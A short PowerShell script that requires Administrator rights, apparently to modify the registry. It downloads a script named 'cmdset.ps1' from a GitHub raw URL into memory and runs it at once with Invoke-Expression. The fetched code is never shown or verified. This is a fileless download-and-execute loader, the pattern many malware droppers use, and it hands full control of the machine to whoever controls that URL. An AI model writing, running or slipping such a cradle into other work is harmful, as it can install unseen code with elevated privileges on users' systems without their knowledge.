# Check if running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Warning "This script requires Administrator privileges to modify the registry. Please run PowerShell as Administrator."
    exit 1
}

try {
    # Download the script content into memory
    Write-Host "Downlading Scripts"
    $scriptUrl = "https://raw.githubusercontent.com/AyahnaSyahid/auth-device/refs/heads/main/cmdset.ps1"
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($scriptUrl)

    # Execute the script content in memory
    Write-Host "Download Finished"
    Invoke-Expression -Command $scriptContent
} catch {
    Write-Error "Failed to download or execute the script. Error: $($_.Exception.Message)"
    exit 1
}